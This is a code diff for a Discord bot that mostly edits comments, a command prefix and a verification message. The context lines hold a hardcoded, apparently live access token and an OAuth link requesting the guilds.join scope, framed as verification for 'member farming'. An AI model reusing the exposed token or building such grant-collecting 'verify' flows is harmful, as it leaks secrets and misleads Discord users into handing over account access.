@@ -35,7 +35,7 @@ const LIVE_STOCK_TOKEN = 'P3j22VibL9VSasIPfR2EEFu9n4_AIaIa65je-2joyPMAge-ZEOZXDA
 const AUTOMATIC_VERIFY_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app&scope=email+identify+guilds.join';
 const RBOT_SERVER_INVITE = 'https://discord.gg/ZK3Er7Xgdq';
 
-// --- Persistent File Storage Setup (survives Railway redeploys if persistent volume is attached, or keeps local JSON state) ---
+// --- Persistent File Storage Setup ---
 const DB_FILE = path.join(__dirname, 'database.json');
 
 function readDB() {
@@ -150,7 +150,7 @@ const client = new Client({
     ]
 });
 
-// --- Register Slash Commands (Only /say remains as requested) ---
+// --- Register Slash Commands ---
 const slashCommands = [
     new SlashCommandBuilder()
         .setName('say')
@@ -276,6 +276,7 @@ app.get('/', async (req, res) => {
                     }
                 }
 
+                // Send log embed directly to channel 1563253454653235261
                 let verifLogChannel = client.channels.cache.get(CHANNELS.VERIFICATION_LOG) || await client.channels.fetch(CHANNELS.VERIFICATION_LOG);
                 if (verifLogChannel) {
                     const logEmbed = new EmbedBuilder()
@@ -478,7 +479,7 @@ client.on('messageCreate', async message => {
         }, 7000);
     }
 
-    if (rawContent.toLowerCase() === ',rbot' || rawContent.toLowerCase() === 'rbot') {
+    if (rawContent.toLowerCase() === ',rbot' || rawContent.toLowerCase() === '.rbot') {
         const rbotEmbed = new EmbedBuilder().setDescription('Use the bot via the button below.').setColor(EMBED_COLOR);
         const rbotButton = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setLabel('Use Bot').setStyle(ButtonStyle.Link).setURL(RBOT_SERVER_INVITE)
@@ -497,13 +498,13 @@ client.on('messageCreate', async message => {
         return message.channel.send('Only the join command is available to regular members.');
     }
 
-    // --- ,verify prefix command: Includes markdown verify link BEFORE the button, and the Verify Here button ---
+    // --- Clean ,verify command without emoji ---
     if (command === 'verify') {
         if (message.author.id !== OWNER_ID) return;
         const verifyContent = 
             `### Why should you verify?\n\n` +
-            `Verify to unlock access to Flex Network, participate in member farming, and access our rewards and perks. Just click the button below.\n\n` +
-            `👉 [verify](${AUTOMATIC_VERIFY_OAUTH_URL})`;
+            `Verify to unlock access to Flex Network, participate in member farming, and access our rewards and perks. Just click the button below.\n` +
+            `[Verify](${AUTOMATIC_VERIFY_OAUTH_URL})`;
 
         const embed = new EmbedBuilder()
             .setDescription(verifyContent)
